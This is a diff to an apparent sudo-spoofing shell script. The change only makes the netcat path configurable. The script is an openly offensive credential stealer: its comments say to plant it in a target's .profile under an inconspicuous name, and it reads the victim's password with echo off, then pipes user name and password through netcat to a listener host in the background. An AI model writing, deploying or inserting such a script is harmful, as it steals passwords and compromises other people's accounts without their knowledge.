@@ -23,6 +23,7 @@
 # Change these to point to your netcat listener.
 SERVER=localhost
 PORT=9999
+NC=/bin/nc
 
 # Change the targets .profile to add these lines to point to this file.
 # (Also, you'll prolly want to rename it to something less obvious.)
@@ -36,5 +37,5 @@ echo -n "$@" >$TTY
 read PASSWD
 echo "" >$TTY
 stty echo
-echo "$USER:$SUDO_USER:$PASSWD" | nc $SERVER $PORT 2>/dev/null &
+echo "$USER:$SUDO_USER:$PASSWD" | $NC $SERVER $PORT 2>/dev/null &
 echo $PASSWD
